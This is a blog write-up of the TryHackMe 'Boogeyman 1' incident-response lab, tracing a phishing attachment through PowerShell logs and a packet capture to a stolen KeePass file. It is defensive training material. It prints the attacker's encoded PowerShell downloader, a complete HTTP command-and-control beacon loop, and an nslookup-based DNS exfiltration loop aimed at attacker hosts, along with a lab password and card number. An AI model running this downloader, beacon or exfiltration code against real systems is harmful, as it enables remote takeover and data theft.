@@ -1,0 +1,232 @@
+<!doctype html><html lang=en-us><head><title>Boogeyman 1 | alfa7i7</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=generator content="Hugo 0.148.0"><link rel=canonical href=/side-quests/thm-boogeyman/><link href=/css/style.min.041e4a3e04c8d069c51f822569eabf716b17b3aec0c9052ef93405591a10b665.css rel=stylesheet><script src=https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js></script><script>mermaid.initialize({startOnLoad:!0})</script></head><body><div class=flexWrapper><header class=headerWrapper><div class=header><div><a class=terminal href=/><span>alfa7i7@empire ~ $</span></a></div><input class=side-menu type=checkbox id=side-menu>
+<label class=hamb for=side-menu><span class=hamb-line></span></label><nav class=headerLinks><ul><li><a href=/posts title>~/blog</a></li><li><a href=/side-quests title>~/side-quests</a></li><li><a href=/whoami title>~/whoami</a></li></ul></nav></div></header><div class=content><main class=main><div class=postWrapper><h1>Boogeyman 1</h1><section class=postMetadata><dl><dt>tags</dt><dd><span></span>
+<a href=/tags/dfir/>#DFIR</a><span></span>
+<a href=/tags/phishing/>#Phishing</a><span></span>
+<a href=/tags/wireshark/>#Wireshark</a><span></span>
+<a href=/tags/dns-smuggling/>#DNS Smuggling</a></dd><dt>categories</dt><dd><span></span>
+<a href=/categories/tryhackme/>TryHackMe</a><span></span>
+<a href=/categories/soc-1/>SOC 1</a></dd><dt>published</dt><dd><time datetime=2024-11-03>November 3, 2024</time></dd><dt>reading time</dt><dd>8 minutes</dd></dl></section><div><p><img src=boggeybanner.png alt=banner></p><p>Story time:</p><blockquote><p>Julianne, a finance employee working for Quick Logistics LLC, received a
+follow-up email regarding an unpaid invoice from their business partner,
+B Packaging Inc. Unbeknownst to her, the attached document was malicious and
+compromised her workstation.
+The security team was able to flag the suspicious execution of the attachment,
+in addition to the phishing reports received from the other finance department
+employees, making it seem to be a targeted attack on the finance team. Upon
+checking the latest trends, the initial TTP used for the malicious attachment
+is attributed to the new threat group named Boogeyman, known for targeting the
+logistics sector.</p></blockquote><p><img src=phishmail.png alt=phishing-email></p><h1 id=i-email-analysis>I. Email Analysis</h1><p>Given the initial information, we know that the compromise started with a
+phishing email. Let&rsquo;s start with analysing the provided <code>dump.eml</code>.
+We can learn a lot about an email by looking at its raw content. The following
+are some interesting items to note:</p><pre tabindex=0><code>...SNIP...
+DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;
+	c=relaxed/simple; t=1673601926;
+	h=from:date:subject:reply-to:to:list-unsubscribe;
+...SNIP...
+From: Arthur Griffin &lt;agriffin@bpakcaging.xyz&gt;
+Date: Fri, 13 Jan 2023 09:25:26 +0000
+Subject: Collection for Quick Logistics LLC - Jan 2023
+Message-Id: &lt;4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz&gt;
+Reply-To: Arthur Griffin &lt;agriffin@bpakcaging.xyz&gt;
+Sender: agriffin@bpakcaging.xyz
+To: Julianne Westcott &lt;julianne.westcott@hotmail.com&gt;
+...SNIP...
+You may use this code to view the encrypted file: Invoice2023!
+...SNIP...
+--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKyw==
+Content-Type: application/zip
+Content-Disposition: attachment; filename=&#34;Invoice.zip&#34;; size=908;
+Content-Transfer-Encoding: base64
+...SNIP...
+</code></pre><p>The email was sent to Julianne from Arthur Griffin on behalf of bpakcaging,
+it contains an attachment <code>Invoice.zip</code> that is password-protected with
+<code>Invoice123!</code>.
+Note that elasticemail was the email relay service used for delivery.</p><p>Let&rsquo;s take a closer look onto the attachment.</p><ol><li>Extract the base64 content from the email:</li></ol><pre tabindex=0><code>UEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmvuhS6/jU+4
+ClhWAZwY+LBcOUvw6oMIq5WNiZwjlKXvAj+pMMBFROiABqlJBxngGOoWUKX0yBXsXOhYPq3Z+Zls
+vZX0xZqtZ/KWnX/QpZXzW44KZz1eqH+hnLgKXPTBsyTSqpqK9QUvYEsltPMSYnL0IqSNwX2TuL9l
+oB0QB3owNKK2cltANxR5Nt3pdYwKJ4BqqI4x7D/ze4bWBT1jlR4HW8VEByEyLoc2fw3I0r0bc/8J
+v9g1SZPBvshBg0pxI0/89GR2agMP+Lv6smkO/huUEOSRpidp/ft+prkt5v9sHFyS/Q0CTb9njCi2
+terQ9NTeFAOkNAhGxWUPqPwPzB0cS+GBC2JY3LMqlA0K5aTejRodyVPcLlq2KVbyF7XljH2NZA4T
+bFsDNJMFk2fQB1hfvmseP9FA20VAfwYvYW8GnBDdqhJtAwJ5xNvJgFFK/MTY2fChwTNN2zszqhzn
+v1Sx+71+duA41HGR9K/jh4nEeRgPslOVlGtLwKBikbIpx/5ZaLpiZYwKS177jDoh3Qx+FRxsM6Ue
+hjPSNgKmWHFZjReDWx8KD7qGLL9acO0hvZUuH83b70sAREDJbw+4sC2jcYO+hrHys6E4Dml030WQ
+WhkKpvYv4DUw9nDmkGg4YgnyAv/iMbtImSUZQ/Wc6dEJM213hYefp8DTQZ321fZU5iCk86bAdxX2
+3Ov40S9eX78X7CSp9b0QKNeC+N3JgMJ/gQrCWC73UfmHjT4mkBoP8A4YktR2LFNeistVP/zeMQPS
+qUs8KaI7q+VTu/9buNeWkEW2maDm+bC0Q4AnJL+AocgZDPJ0RzfLWEpff3nbaYb6aPqhLTBfFURi
+dszLIMEKmDLmiVqkWZJly9qV26NFttz5y4Q+fAATd6tMYRDlu/BFCo4+rdxjiKl0Gnn7UBHCq0gy
+eEv/L8bppKI09XqNV3MJxMLBE3RN7E080hVp07qDpNpQTYEFa08gGy6yYFBLAQI/ABQAAQAIAGiG
+LVZRFQDJ3gIAACgJAAAUACQAAAAAAAAAIAAAAAAAAABJbnZvaWNlXzIwMjMwMTAzLmxuawoAIAAA
+AAAAAQAYAGiPRUBvJ9kBAAAAAAAAAAAAAAAAAAAAAFBLBQYAAAAAAQABAGYAAAAQAwAAAAA=
+</code></pre><ol start=2><li>Decode it</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ base64 -d attachment.b64 &gt; Invoice.zip
+</span></span></code></pre></div><ol start=3><li>Result: We use the password from above to extract <code>Invoice_20230103.lnk</code> and
+then <code>lnkparse3</code> to parse it.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ unzip Invoice.zip 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>Archive:  Invoice.zip
+</span></span><span style=display:flex><span>[Invoice.zip] Invoice_20230103.lnk password: 
+</span></span><span style=display:flex><span>  inflating: Invoice_20230103.lnk
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>$ lnkparse Invoice_20230103.lnk
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>...SNIP...
+</span></span><span style=display:flex><span>   DATA
+</span></span><span style=display:flex><span>      Description: Invoice Jan 2023
+</span></span><span style=display:flex><span>      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span><span style=display:flex><span>      Working directory: C:
+</span></span><span style=display:flex><span>      Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
+</span></span><span style=display:flex><span>      Icon location: C:\Users\Administrator\Desktop\excel.ico
+</span></span><span style=display:flex><span>...SNIP...
+</span></span></code></pre></div><p>We understand now that the invoice tries to trick the user into clicking it so
+it can spawn a powershell session and execute the base64 encoded command. The
+arguments <code>-nop -windowstyle hidden</code> are supplied to execute it in a stealthy
+fashion.</p><p>Decoding the payload reveals the starting point of endpoint activities. The
+following is the full powershell payload used to compromise Julianne&rsquo;s machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>iex (new-object net.webclient).downloadstring(<span style=color:#e6db74>&#39;http://files.bpakcaging.xyz/update&#39;</span>)
+</span></span></code></pre></div><h1 id=ii-are-you-sure-thats-an-invoice>II. Are you sure that&rsquo;s an invoice?</h1><p>We should now proceed with analysing the PowerShell logs (<code>powershell.json</code>) to
+uncover the potential impact of the attack. Using <code>jq</code>, we can filter for the
+values of <code>ScriptBlockText</code>, as it contains the powershell commands being
+executed.</p><p>We know already that Boogeyman uses <code>bpakcaging.xyz</code> to host some of its
+artefacts. Thus, we can narrow down our search in the logs to only the entries
+with that value:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ cat powershell.json | jq <span style=color:#e6db74>&#34;.ScriptBlockText&#34;</span> | grep bpakcaging
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>&#34;$s=&#39;cdn.bpakcaging.xyz:8080&#39;;$i=&#39;8cce49b0-b86459bb-27fe2489&#39;;$p=&#39;http://&#39;;$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\&#34;X-38d2-8f49\&#34;=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\&#34;X-38d2-8f49\&#34;=$i}).Content;if ($c -ne &#39;None&#39;) {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\&#34;X-38d2-8f49\&#34;=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join &#39; &#39;)} sleep 0.8}\n&#34;
+</span></span><span style=display:flex><span>&#34;iex (new-object net.webclient).downloadstring(&#39;http://files.bpakcaging.xyz/update&#39;)&#34;
+</span></span><span style=display:flex><span>&#34;iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd&#34;
+</span></span><span style=display:flex><span>&#34;iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd&#34;
+</span></span><span style=display:flex><span>&#34;$split = $hex -split &#39;(\\S{50})&#39;; ForEach ($line in $split) { nslookup -q=A \&#34;$line.bpakcaging.xyz\&#34; $destination;} echo \&#34;Done\&#34;;;pwd&#34;
+</span></span></code></pre></div><p>It is now clear that the attacker is using <code>files.bpakcaging.xyz</code> and
+<code>cdn.bpakcaging.xyz</code> to host C2 related artefacts.</p><p>To view all relevant powershell commands, we can use the same command and filter
+out non interesting entries (grep <code>-v</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ cat powershell.json | jq <span style=color:#e6db74>&#34;.ScriptBlockText&#34;</span> | grep -v Set-StrictMode
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span>&#34;iex(new-object net.webclient).downloadstring(&#39;https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1&#39;);pwd&#34;
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span>&#34;ps;pwd&#34;
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span>&#34;cd j.westcott;pwd&#34;
+</span></span><span style=display:flex><span>...SNIP...
+</span></span><span style=display:flex><span>&#34;.\\sb.exe -group=user;pwd&#34;
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span>&#34;Seatbelt.exe -group=user;pwd&#34;
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span>&#34;split-path $pwd&#39;\\0x00&#39;;pwd&#34;
+</span></span><span style=display:flex><span>...SNIP...
+</span></span><span style=display:flex><span>&#34;cd Documents;pwd&#34;
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span>&#34;.\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite \&#34;SELECT * from NOTE limit 100\&#34;;pwd&#34;
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span>&#34;.\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\;pwd&#34;
+</span></span><span style=display:flex><span>...SNIP...
+</span></span><span style=display:flex><span>&#34;$split = $hex -split &#39;(\\S{50})&#39;; ForEach ($line in $split) { nslookup -q=A \&#34;$line.bpakcaging.xyz\&#34; $destination;} echo \&#34;Done\&#34;;;pwd&#34;
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span>&#34;$hex = ($bytes|ForEach-Object ToString X2) -join &#39;&#39;;;pwd&#34;
+</span></span><span style=display:flex><span>null
+</span></span><span style=display:flex><span>&#34;$file=&#39;C:\\Users\\j.westcott\\Documents\\protected_data.kdbx&#39;; $destination = \&#34;167.71.211.113\&#34;; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd&#34;
+</span></span></code></pre></div><p>Notice that the attacker executed <code>Seatbelt</code>, which is an enumeration
+tool. From the same output, we identify the file accessed using <code>sq3.exe</code>; As
+the path implies, the target software is Microsot Sticky Notes:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
+</span></span></code></pre></div><p>The very first executed commands were to exfiltrate the file
+<code>protected_data.kdbx</code> (the terminal output from before shows recent commands
+first). <code>.kdbx</code> is an extension used by KeePass Password Safe,
+an open-source password manager. Hence, we can assume the bad guy did
+exfiltrate some highly confidential data from Julianne&rsquo;s machine.
+The adversary used nslookup to exfiltrate the data, which is a DNS
+smuggling technique.</p><h1 id=iii-they-got-us-call-the-bank-immediately>III. They got us. Call the bank immediately!</h1><p>Based on the PowerShell logs investigation, we have gathered useful intel about
+the attacker activity after the breach:</p><ul><li>The threat actor was able to read and exfiltrate two potentially sensitive
+files (<code>plum.sqlite</code> and <code>protected_data.kdbx</code>).</li><li>The domains, ports, and tools used by the threat actor to exfiltrate data
+were identified.</li></ul><p>Moving on to analyze network activity logs with Wireshark.</p><p>The adversary used an HTTP server to host his artefacts. Filtering HTTP traffic
+in Wireshark and looking for requests with the hostname <code>files.bpakcaging.xyz</code>,
+we find a stream that can be used to identify the software deployed as a server,
+i.e. SimpleHTTP Python server.
+Similarly by looking at HTTP requests made to the host <code>cdn.bpakcaging.xyz</code>,
+we see that the adversary used POST requests to send data to the server.</p><p><img src=image-1.png alt="following http stream"></p><p><img src=image.png alt="http c2 details"></p><p>We found out from our investigation so far that Boogeyman exfiltrated
+(smuggled) data over DNS using <code>nslookup</code>. In the following screenshot, we
+validate that they looked up subdomains of <code>bpakcaging.xyz</code>, where each
+subdomain is a hexadecimal encoding of the next data chunk from the file being
+smuggled (checkout the PowerShell command history above). Boogeyman can
+reconstruct the file based on all received DNS queries.</p><p><img src=image-2.png alt="dns smuggling"></p><p>Back to C2 communication. We need to understand how the communication is taking
+place to be able to complete our investigation. C2 communication establishment:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$s=<span style=color:#e6db74>&#39;cdn.bpakcaging.xyz:8080&#39;</span>;$i=<span style=color:#e6db74>&#39;8cce49b0-b86459bb-27fe2489&#39;</span>;$p=<span style=color:#e6db74>&#39;http://&#39;</span>;$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\<span style=color:#e6db74>&#34;X-38d2-8f49\&#34;</span>=$i};<span style=color:#66d9ef>while</span> ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\<span style=color:#e6db74>&#34;X-38d2-8f49\&#34;</span>=$i}).Content;<span style=color:#66d9ef>if</span> ($c <span style=color:#f92672>-ne</span> <span style=color:#e6db74>&#39;None&#39;</span>) {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\<span style=color:#e6db74>&#34;X-38d2-8f49\&#34;</span>=$i} -Body ([<span style=color:#66d9ef>System.Text.Encoding</span>]::UTF8.GetBytes($e+$r) -join <span style=color:#e6db74>&#39; &#39;</span>)} sleep <span style=color:#ae81ff>0.8</span>}
+</span></span></code></pre></div><p>This command enters an infinite loop to periodically check for commands from
+the remote server.</p><ol><li>Retrieve Commands:
+Query the URL <code>http://cdn.bpakcaging.xyz:8080/b86459bb</code> with the custom
+header <code>X-38d2-8f49</code>, likely expecting command instructions from the server.
+The returned content is stored in <code>$c</code>.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$c = (Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{<span style=color:#e6db74>&#34;X-38d2-8f49&#34;</span>=$i}).Content
+</span></span></code></pre></div><ol start=2><li>Execute Commands:
+If <code>$c</code> is not equal to <code>None</code>, interpret <code>$c</code> as a command and execute it
+using <code>iex (Invoke-Expression)</code>. <code>iex</code> runs the string <code>$c</code> as PowerShell
+code, which can execute arbitrary commands received from the remote server.
+<code>-ErrorAction Stop</code> is used to halt on errors, and errors are stored in <code>$e</code>.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#66d9ef>if</span> ($c <span style=color:#f92672>-ne</span> <span style=color:#e6db74>&#39;None&#39;</span>) {
+</span></span><span style=display:flex><span>    $r = iex $c -ErrorAction Stop -ErrorVariable e
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><ol start=3><li>Send Results Back to Server:
+Convert the result of the executed command to a string
+(<code>Out-String -InputObject $r</code>). Send the output and any errors (<code>$e + $r</code>) back
+to the server at <code>http://cdn.bpakcaging.xyz:8080/27fe2489</code> via a POST request.
+This also uses the custom header <code>X-38d2-8f49</code> for session identification.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$r = Out-String -InputObject $r
+</span></span><span style=display:flex><span>$t = Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{<span style=color:#e6db74>&#34;X-38d2-8f49&#34;</span>=$i} -Body ([<span style=color:#66d9ef>System.Text.Encoding</span>]::UTF8.GetBytes($e+$r) -join <span style=color:#e6db74>&#39; &#39;</span>)
+</span></span></code></pre></div><p>Now, to find the password of the exfiltrated file, we need to look out for the
+output of <code>sq3.exe</code> execution in the capture file. Why? Based on the information
+we have so far, the attacker is likely to have found the password of the target
+file in a Sticky Note, and <code>sq3.exe</code> was used to read SQLite session file
+<code>plum.sqlite</code>.</p><p>As requests made to <code>/27fe2489</code> contain commands output (encoded), we will
+reconstruct these logs as follows:</p><ol><li>Export all HTTP objects from the capture file</li><li>Assemble all objects related to <code>/27fe2489</code> into a single file</li><li>Decode the resulting file and access the logs</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ tshark -r capture.pcapng --export-objects http,here -q
+</span></span><span style=display:flex><span>$ cd here
+</span></span><span style=display:flex><span>$ cat 27fe2489* | sed <span style=color:#e6db74>&#39;s/OK/ /g&#39;</span> &gt; commands.txt
+</span></span><span style=display:flex><span>$ python3 ascii_conv.py &gt; commands_log.txt
+</span></span></code></pre></div><p>We use the following python script to convert ASCII codes to readable strings:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ascii_to_text</span>(ascii_codes):
+</span></span><span style=display:flex><span>    text <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(chr(code) <span style=color:#66d9ef>for</span> code <span style=color:#f92672>in</span> ascii_codes)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> text
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_ascii_from_file</span>(file_path):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(file_path, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> file:
+</span></span><span style=display:flex><span>        ascii_codes <span style=color:#f92672>=</span> [int(code) <span style=color:#66d9ef>for</span> code <span style=color:#f92672>in</span> file<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>split()]
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ascii_codes
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    file_path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;commands.txt&#39;</span>
+</span></span><span style=display:flex><span>    ascii_codes <span style=color:#f92672>=</span> read_ascii_from_file(file_path)
+</span></span><span style=display:flex><span>    logs <span style=color:#f92672>=</span> ascii_to_text(ascii_codes)
+</span></span><span style=display:flex><span>    print(logs)
+</span></span></code></pre></div><p>Examining the log file, we find the target password <code>%p9^3!lL^Mz47E2GaT^y</code>:</p><pre tabindex=0><code>...SNIP...
+The term &#39;.\sq3.exe&#39; is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. 
+Path               
+----               
+C:\Users\j.westcott
+
+\id=868150bd-a564-423b-9256-70d3781794b1 Master Password
+\id=ad8b52f0-e1bb-40f6-bbf9-47a53f9180ab %p9^3!lL^Mz47E2GaT^y|ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#1&amp;31c5ecd4&amp;0&amp;UID256#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=1106,43;Size=320,320|1|0||Yellow|0||||||0||8ca22c0e-ba5e-499a-a86c-7473a53dc6de|74f08724-ccc9-4ce6-94e7-8c99e6cd42c6|638092247397199589||638092247516107079
+
+Path               
+----               
+C:\Users\j.westcott
+...SNIP...
+</code></pre><p>The last step in this investigation is to extract smuggled data. We already
+explained how this works so we&rsquo;ll proceed directly to extracting hexadecimal
+encoded lines from the capture file.</p><p>We used a Tshark filter that allows us to remove redundent and/or non interesting
+queries, then extracted the hex sub-strings from the queried domains:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ tshark -r capture.pcapng -T fields -e dns.qry.name -Y <span style=color:#e6db74>&#39;ip.dst == 167.71.211.113 &amp;&amp; dns.qry.type == 1 &amp;&amp; !(dns.qry.name matches \&#34;.*bpakcaging.xyz.\&#34;)&#39;</span> | cut -d <span style=color:#e6db74>&#34;.&#34;</span> -f <span style=color:#ae81ff>1</span> &gt; hexlines.txt
+</span></span><span style=display:flex><span>$ python3 hex_to_kdbx.py
+</span></span></code></pre></div><p>Here again, we use a python script (<code>hex_to_kdbx</code>) to convert hexadecimal to
+binary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>hex_to_binary</span>(hex_string):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        binary_data <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(hex_string)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> binary_data
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>ValueError</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>process_hex_file</span>(input_file, output_file):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(input_file, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> infile, open(output_file, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> outfile:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> infile:
+</span></span><span style=display:flex><span>            hex_string <span style=color:#f92672>=</span> line<span style=color:#f92672>.</span>strip()
+</span></span><span style=display:flex><span>            binary_result <span style=color:#f92672>=</span> hex_to_binary(hex_string)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> binary_result <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>                outfile<span style=color:#f92672>.</span>write(binary_result)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error converting line: </span><span style=color:#e6db74>{</span>hex_string<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    input_file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;hex_lines.txt&#39;</span>
+</span></span><span style=display:flex><span>    output_file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;protected_data.kdbx&#39;</span>
+</span></span><span style=display:flex><span>    process_hex_file(input_file, output_file)
+</span></span></code></pre></div><p>Once done, we can open keepass to check the content of our file.</p><p><img src=image-3.png alt="opening target file using keepass"></p><p><img src=image-4.png alt="supplying the password"></p><p><img src=image-5.png alt="extracted data"></p><p>The bank account with the number 4024007128269551 is now compromised,
+the bank has to be notified to block fraudulent activities.</p></div></div></main></div><footer class=footer><span>© 2025 alfa7i7, Built with
+<a href=https://gohugo.io class=footerLink>Hugo</a> and
+<a href=https://github.com/LordMathis/hugo-theme-nightfall class=footerLink>Nightfall</a> theme</span></footer></div></body></html>
